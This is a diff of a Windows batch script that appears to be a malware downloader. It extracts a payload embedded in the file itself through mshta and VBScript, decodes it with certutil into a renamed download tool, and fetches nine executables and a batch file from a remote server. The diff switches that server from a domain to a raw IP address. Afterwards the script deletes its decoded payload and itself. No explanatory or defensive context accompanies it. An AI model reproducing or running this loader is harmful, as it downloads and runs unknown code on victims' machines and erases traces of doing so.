@@ -6,17 +6,17 @@ cd wg
 set "x=%~f0"& set fso=CreateObject("Scripting.FileSystemObject")
 >>"wgot.64" mshta "vbscript:%fso%.GetStandardStream(1).Write(Split(%fso%.OpenTextFile("%x: ="+Chr(32)+"%").ReadAll(),vbCrLf+"exit"+Chr(32)+"/b"+Chr(32)+"0"+vbCrLf)(1))&Close()"
 certutil.exe -decode wgot.64 wgot.exe
-echo http^:^/^/duserifram.toshibanetcam.com^/Drw >> wgot.txt
+echo http^:^/^/37.52.9.2^/Drw >> wgot.txt
 echo wgot ^-c ^-i wgot.txt > wgot.bat
-wgot -c http://duserifram.toshibanetcam.com/app.exe
-wgot -c http://duserifram.toshibanetcam.com/UpEx.exe
-wgot -c http://duserifram.toshibanetcam.com/UpEx2.exe
-wgot -c http://duserifram.toshibanetcam.com/UpEx3.exe
-wgot -c http://duserifram.toshibanetcam.com/UpEx4.exe
-wgot -c http://duserifram.toshibanetcam.com/dusers.exe
-wgot -c http://duserifram.toshibanetcam.com/Procx.exe
-wgot -c http://duserifram.toshibanetcam.com/tibok.bat
-wgot -c http://duserifram.toshibanetcam.com/intelusr.exe
+wgot -c http://37.52.9.2/app.exe
+wgot -c http://37.52.9.2/UpEx.exe
+wgot -c http://37.52.9.2/UpEx2.exe
+wgot -c http://37.52.9.2/UpEx3.exe
+wgot -c http://37.52.9.2/UpEx4.exe
+wgot -c http://37.52.9.2/dusers.exe
+wgot -c http://37.52.9.2/Procx.exe
+wgot -c http://37.52.9.2/tibok.bat
+wgot -c http://37.52.9.2/intelusr.exe
 del /f /q wgot.64
 del /f /q "%0"
 exit /b 0
